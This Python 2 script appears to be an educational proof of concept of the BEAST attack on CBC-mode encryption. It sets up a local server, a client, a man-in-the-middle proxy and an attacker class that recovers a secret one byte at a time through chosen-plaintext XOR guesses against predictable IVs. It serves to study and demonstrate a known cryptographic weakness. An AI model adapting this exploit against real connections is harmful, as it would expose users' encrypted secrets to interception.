#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import binascii
import random
import re
import select
import socket
import SocketServer
import ssl
import string
import sys
import struct
import threading
import time
import os
from utils.view import *
from pprint import pprint
from struct import *
from itertools import cycle, izip
from Crypto.Cipher import AES
from Crypto import Random

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[:-ord(s[len(s)-1:])]

class AESCipher:
    def __init__( self, key ):
        self.key = key
        self.iv = Random.new().read( AES.block_size )

    def set_vector_init(self, iv):
        self.iv = iv

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = self.iv
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return iv + cipher.encrypt( raw )

    def decrypt( self, enc ):
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))


class SecureTCPHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    #loop to avoid broken pipe
    while True:
        try:
            data = self.request.recv(1024)
            if data == '':
                break
            # de = cbc.decrypt(data)
            # print [de[i:i+16] for i in range(0, len(de), 16)]
        except ssl.SSLError as e:
            pass
    return

class Server:
    """The secure server.
    A sample server, serving on his host and port waiting the client 
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        self.httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
        server = threading.Thread(target=self.httpd.serve_forever)
        server.daemon=True
        server.start()
        print('Server is serving HTTPS on {!r} port {}'.format(self.host, self.port))
        return

    def get_host(self):
        return self.host

    def get_port(self):
        return self.port

    def disconnect(self):
        print('Server stop serving HTTPS on {!r} port {}'.format(self.host, self.port))
        self.httpd.shutdown()
        return

class Client(AESCipher):
    """ The unsecure post of the client can be a "unsecure" browser for example.
    The client generate a random cookie and send it to the server through the proxy
    The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
    """

    def __init__(self, host, port, cbc):
        self.proxy_host = host
        self.proxy_port = port
        self.cbc = cbc
        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
        print draw("Sending request : ", bold=True, fg_yellow=True)
        print draw("the secret is Gybscdefghicasaa" + "\n\n",  bold=True, fg_yellow=True)

    def connection(self):
        # Initialization of the client
        ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock.connect((self.proxy_host,self.proxy_port))
        ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.socket = ssl_sock
        return

    def request_send(self, prefix=0, data=0):
        if data == 0:
            data = prefix*"a" + "the secret is Gybscdefghicasaa"
        try:
            data = self.cbc.encrypt(data)
            self.socket.sendall(data)
        except ssl.SSLError as e:
            pass
        pass
        return

    def disconnect(self):
        self.socket.close()
        return

class ProxyTCPHandler(SocketServer.BaseRequestHandler):
    """ 
    Start a connection to the secure server and handle multiple socket connections between the client and the server
    Informe the attacker about the client's frames or the server's response
    Finally redirect the data from the client to the server and inversely
    """
    def handle(self):

        # Connection to the secure server
        socket_server = socket.create_connection((server.get_host(), server.get_port()))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        data_altered = False
        length_header = 24
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:

                    data = socket_server.recv(1024)
                    if len(data) == 0:
                        running = False
                        break
                    # serveur -> client
                    self.request.send(data)

                elif source is self.request:
                    
                    data = self.request.recv(1024)
                    if len(data) == 0:
                        running = False
                    else:
                        #print "Alter"
                        exploit.set_length_frame(data)
                        exploit.alter()
                        #print ''
                    
                    # we send data to the server
                    socket_server.send(data)
        return

class Proxy:
    """ Assimilate to a MitmProxy
    start a serving on his host and port and redirect the data to the server due to this handler
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        httpd = SocketServer.TCPServer((self.host, self.port), ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon=True
        proxy.start()
        print('Proxy is launched on {!r} port {}'.format(self.host, self.port))
        self.proxy = httpd
        return

    def disconnect(self):
        print('Proxy is stopped on {!r} port {}'.format(self.host, self.port))
        self.proxy.shutdown()
        return

class BEAST(Client, AESCipher):
    """ Assimilate to the attacker
    detect the length of a CBC block
    alter the ethernet frame of the client to decipher a byte regarding the proxy informations
    """

    def __init__(self, client, cbc):
        self.client = client
        self.cbc = cbc
        self.length_block = 16
        self.start_exploit = False
        self.decipherable = False
        self.request = ''
        self.byte_decipher = 0
        self.length_frame = 0
        self.block_decipher = 0
        self.vector_init = ''
        self.previous_cipher = ''
        self.frame = ''

    def run(self):
        print "Start decrypting the request...\n"
        
        secret = []

        #client send + alter
        test = "the secret is "
        padding = self.length_block - len(test) - 1
        test = "a"*padding + test
        add_byte = self.length_block
        t = 0
        while(t < 16):
            for i in range(1,256):
                self.start_exploit = True
                self.client_connection()
                self.request_send(add_byte+padding)
                time.sleep(0.05)           
                #print "frame1"
                #print split_len(binascii.hexlify(self.frame), 32)
                original = split_len(binascii.hexlify(self.frame), 32)

                self.start_exploit = False
                p_guess = test + chr(i)
                xored = self.xor_block(p_guess, i)

                self.request_send(add_byte+padding, xored)
                time.sleep(0.05)
                #print "frame2"
                #print split_len(binascii.hexlify(self.frame), 32)
                result = split_len(binascii.hexlify(self.frame), 32)

                ts = getTerminalSize()
                if ts[0] >= 237:
                    sys.stdout.write("\r%s ----> %s" % (original[1:], result[1:]))
                    sys.stdout.flush()
                else:
                    sys.stdout.write("\r%s" % (search(i)))
                    sys.stdout.flush()

                if result[1] == original[2]:
                    print " Find char " + chr(i) + " after " + str(i) +" tries"
                    test = p_guess[1:]
                    add_byte = add_byte - 1
                    secret.append(chr(i))
                    t = t + 1
                    break

        secret = ''.join(secret)
        print "\nthe secret is " + secret
        self.client_disconect()
        return

    def xor_strings(self, xs, ys, zs):
        return "".join(chr(ord(x) ^ ord(y) ^ ord(z)) for x, y, z in zip(xs, ys, zs))

    def alter(self):
        #print self.start_exploit
        if self.start_exploit is True:
            self.frame = bytearray(self.frame)
            self.vector_init = str(self.frame[-self.length_block:])

            self.cbc.set_vector_init(self.vector_init)

            self.previous_cipher = str(self.frame[self.length_block:self.length_block*2])
            return str(self.frame)
        return self.frame

    def xor_block(self,p_guess, i):
        xored = self.xor_strings(self.vector_init, self.previous_cipher, p_guess)
        return xored

    def set_length_frame(self, data):
        self.frame = data
        self.length_frame = len(data)

    def client_connection(self):
        self.client.connection()
        return

    def request_send(self, prefix=0, data=0):
        self.client.request_send(prefix, data)
        return

    def client_disconect(self):
        self.client.disconnect()
        return

if __name__ == '__main__':                           

    parser = argparse.ArgumentParser(description='Connection with SSLv3')
    parser.add_argument('host', help='hostname or IP address')
    parser.add_argument('port', type=int, help='TCP port number')
    parser.add_argument('-v', help='debug mode', action="store_true")
    args = parser.parse_args()

    cbc = AESCipher('V38lKILOJmtpQMHp')
    server   = Server(args.host, args.port)
    client   = Client(args.host, args.port+1, cbc)
    spy      = Proxy(args.host, args.port+1)
    exploit  = BEAST(client, cbc)

    server.connection()
    spy.connection()

    exploit.run()

    spy.disconnect()
    server.disconnect()
